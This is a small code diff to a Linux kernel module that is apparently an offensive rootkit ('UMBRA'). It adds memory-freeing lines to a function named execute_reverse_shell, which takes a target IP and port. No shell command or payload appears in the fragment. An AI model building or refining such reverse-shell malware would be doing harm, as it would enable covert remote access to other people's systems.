@@ -29,6 +29,10 @@ void execute_reverse_shell(struct work_struct *work){
         printk(KERN_INFO "UMBRA:: Error executing usermodehelper.\n");
     }
     kfree(exec);
+    kfree(params->target_ip);
+    kfree(params->target_port);
+    kfree(params);
+
 }
 
 
